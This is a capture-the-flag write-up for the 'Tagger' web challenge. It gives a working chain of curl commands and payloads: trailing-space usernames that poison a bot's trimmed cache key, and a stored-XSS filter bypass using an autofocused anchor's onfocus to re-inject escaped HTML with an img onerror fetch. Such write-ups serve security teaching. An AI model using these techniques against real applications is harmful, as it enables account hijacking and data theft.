# Tagger

A chat app with a Puppeteer bot that hands the flag to the `Hacker` account when
it sees the exact phrase "Give me the flag!" (web / stored XSS, 500 pts). Key idea:
trailing-space usernames collide with the bot's message-history cache keys, and an
`<a autofocus onfocus>` + `this.textContent` trick escapes the event-handler
character filter to inject a full XSS payload.

## Recon

Given file: `challenge.zip` — Express + EJS + Sequelize/SQLite + a Puppeteer bot.

```bash
$ unzip -l challenge.zip | head
  app.js
  bot/index.js
  services/messageMarkup.js
  services/friendships.js
  routes/messages.js
  routes/auth.js
  routes/friends.js
  ...
```

Key facts from the source:

- Bot cycle (every 60 s): `visitAsHacker` logs in as `Hacker`, opens
  `/chat/<FlagHolder>`, waits 3 s; then `replyAsFlagHolder` logs in as
  `FlagHolder` and sends the flag to `Hacker` **only if** the conversation-list
  preview equals `"Give me the flag!"`.
- The registration username regex is `/^[a-zA-Z0-9_ ]{3,32}$/` — **spaces are
  allowed**, so `"Hacker "` and `"FlagHolder "` are distinct accounts.
- `messageHistoryCache` is keyed by
  `` `${firstUsername.trim()}:${secondUsername.trim()}` `` with a 60 s TTL and
  stores the `Message.findAll(...)` Promise for the *caller's* user IDs.
- The message `POST` route lets friends override `tagName`, `type`, `attributes`,
  and `content` (only `from`/`to` are fixed).
- CSP: `script-src-elem 'self'` (blocks inline `<script>`) but
  `script-src-attr 'unsafe-inline'` (inline event handlers are allowed).
- The attribute filter in `messageMarkup.js` allows attribute values of only
  `[a-zA-Z0-9,. =]` (no parens/quotes/brackets/slashes/colons/semicolons), and
  `tagName` must be effectively one lowercase letter.

## Analysis

Observation 1: the cache key trims usernames, so an account named `"Hacker "`
(id 3) collides with the bot's `"Hacker"` (id 1) under the key `Hacker:FlagHolder`,
and `"FlagHolder "` (id 4) collides with `"FlagHolder"` (id 2). Confirmed live: our
`GET /chat/<id4>` as `"Hacker "` returns the bot's cached real messages once the
bot has populated that key. This is a **cache-key normalization collision**.

Observation 2: the bot's `replyAsFlagHolder` preview is a *direct DB query* (the
latest `Message`), not the cache. Dead end: poisoning the cache alone does **not**
change the preview, so we cannot just make FlagHolder send the flag by cache
poisoning. We need the bot to *actually post* "Give me the flag!" to the real
FlagHolder.

Observation 3: a direct XSS payload cannot fit in an event handler because the
attribute-value filter blocks `()`, quotes, and semicolons. Hypothesis: use a
two-stage payload. Confirmed in Chromium (`window.GOT=1`):

- Outer message: `tagName="a"`, attributes
  `href=x`, `autofocus=autofocus`,
  `onfocus="document.body.innerHTML=this.textContent"` — all allowed characters,
  and `autofocus` fires the handler with no user interaction.
- The anchor's *text content* is the HTML-escaped message `content`; reading
  `this.textContent` recovers the **raw** (unescaped) content, and
  `document.body.innerHTML=this.textContent` re-injects it as real HTML.
- The inner HTML is then a full `<img src=x onerror="fetch(...)">` payload, whose
  inline `onerror` handler is allowed by `script-src-attr 'unsafe-inline'`.

So the full plan: poison the bot Hacker's view so its browser POSTs
"Give me the flag!" to the real FlagHolder, then read the reply through the same
cache-key collision.

## Exploit

1. **Register the colliding accounts.** The trailing space passes the username
   regex and is preserved, while `.trim()` later drops it.

```bash
$ curl -s -c jar3 -d 'username=Hacker%20&password=password123&confirmPassword=password123' http://HOST/register
$ curl -s -c jar4 -d 'username=FlagHolder%20&password=password123&confirmPassword=password123' http://HOST/register
```

(`Hacker ` gets id 3, `FlagHolder ` gets id 4.)

2. **Friend the two fake accounts.** They are not `hidden`, so the friend-request
   route accepts them.

```bash
$ curl -s -b jar3 -d '' http://HOST/friends/request/4
$ curl -s -b jar4 -d '' http://HOST/friends/accept/1
```

3. **Send the poison message** from `Hacker ` to `FlagHolder ` (overriding
   `tagName`, `attributes`, and `content`).

```bash
$ curl -s -b jar3 http://HOST/chat/4/message \
  --data-urlencode 'message=x' \
  --data-urlencode 'tagName=a' \
  --data-urlencode 'type=text' \
  --data-urlencode 'attributes={"href":"x","autofocus":"autofocus","onfocus":"document.body.innerHTML=this.textContent"}' \
  --data-urlencode 'content=<img src=x onerror="fetch('"'"'/chat/2/message'"'"',{method:'"'"'POST'"'"',headers:{'"'"'Content-Type'"'"':'"'"'application/x-www-form-urlencoded'"'"'},body:'"'"'message=Give me the flag!'"'"'})">'
```

This stores a message whose rendered form is:

```html
<a href="x" autofocus="autofocus" onfocus="document.body.innerHTML=this.textContent">
  &lt;img src=x onerror="fetch('/chat/2/message', ...)"&gt;
</a>
```

4. **Poison the shared cache key** `Hacker:FlagHolder`. Visiting
   `/chat/4` as `Hacker ` computes `"Hacker ".trim()+":"+"FlagHolder ".trim()` =
   `Hacker:FlagHolder` and caches *our* pair (3,4) — the poison message. Repeat
   every ~25 s so the 60 s TTL never expires.

```bash
$ while true; do curl -s -b jar3 http://HOST/chat/4 -o /dev/null; sleep 25; done
```

5. **Bot Hacker renders the poison and posts the trigger phrase.** On the next
   cycle, `visitAsHacker` requests `getMessageHistory(1, 2, 'Hacker', 'FlagHolder')`,
   hits our cached promise (the poison message), and renders the anchor.
   `autofocus` fires `onfocus`; `this.textContent` recovers the raw inner HTML;
   `innerHTML` re-injects the `<img>`, and its `onerror` (allowed by CSP) fires a
   `fetch` as the real `Hacker` to the real `FlagHolder` (id 2):

```javascript
fetch('/chat/2/message', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'message=Give me the flag!'
})
```

This creates a real DB message `Hacker -> FlagHolder` with the trigger text.

6. **FlagHolder replies with the flag.** In the same cycle,
   `replyAsFlagHolder`'s preview query now returns `"Give me the flag!"`, so it
   sends the flag to `Hacker` (real DB message `FlagHolder -> Hacker`).

7. **Read the flag through the cache collision.** Stop poisoning and wait for our
   entry to expire (60 s). The next bot `visitAsHacker` repopulates
   `Hacker:FlagHolder` with the *real* (id 1, id 2) messages — now including the
   flag. Then request `/chat/4` as `Hacker ` and read the cached messages.

```bash
$ sleep 60
$ curl -s -b jar3 http://HOST/chat/4 | grep -o 'TFCCTF{[^<]*}'
TFCCTF{Tagg3r_m15C0muN1cA710n}
```

## Full chain

1. register `Hacker ` (id 3) and `FlagHolder ` (id 4)
2. `POST /friends/request/4` then `POST /friends/accept/1` (as the fake accounts)
3. `POST /chat/4/message` as `Hacker ` with `tagName=a`,
   `attributes={href:x, autofocus:autofocus, onfocus:"document.body.innerHTML=this.textContent"}`,
   `content=<img src=x onerror="fetch('/chat/2/message',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'message=Give me the flag!'})">`
4. loop `GET /chat/4` as `Hacker ` every ~25 s to poison the `Hacker:FlagHolder` cache key
5. bot Hacker renders the poison -> `onfocus` -> `innerHTML` -> `<img onerror>` POSTs `message=Give me the flag!` to id 2
6. bot FlagHolder sees preview `Give me the flag!` -> sends flag to Hacker
7. stop poisoning, wait >60 s, then `GET /chat/4` as `Hacker ` and grep the flag

## Flag

`TFCCTF{Tagg3r_m15C0muN1cA710n}`

## Lessons

- Cache keys built from `username.trim()` (or any normalization) collide with a
  bot's key when the username grammar allows trailing spaces; poison the bot's
  view through that shared entry.
- A character filter that forbids `()"';` in an event handler is bypassed with
  `onfocus="document.body.innerHTML=this.textContent"`: the anchor carries the real
  payload as escaped *text*, and `innerHTML` re-injects it raw.
- `script-src-elem 'self'` alone does not stop XSS when
  `script-src-attr 'unsafe-inline'` is also set — inline `onerror` handlers still
  run.
